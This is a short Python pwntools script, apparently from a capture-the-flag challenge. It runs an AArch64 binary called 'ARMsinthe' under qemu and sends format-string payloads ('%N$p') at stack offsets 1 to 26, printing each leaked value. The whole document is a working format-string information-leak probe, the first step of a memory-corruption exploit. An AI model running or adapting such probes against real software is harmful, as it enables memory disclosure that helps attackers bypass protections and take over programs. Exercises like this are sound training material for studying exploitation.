#!/usr/bin/env python
from pwn import *

for i in range(1, 27):
    try:
        p = process(
            ['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', 'ARMsinthe'], level='error')
        p.recvuntil(b'->')
        p.sendline("%%%d$p" % i)
        p.recvuntil(b'You said')
        print(i, hex(int(p.recvline().strip(b'\n'), 16)))
        p.close()
    except:
        pass
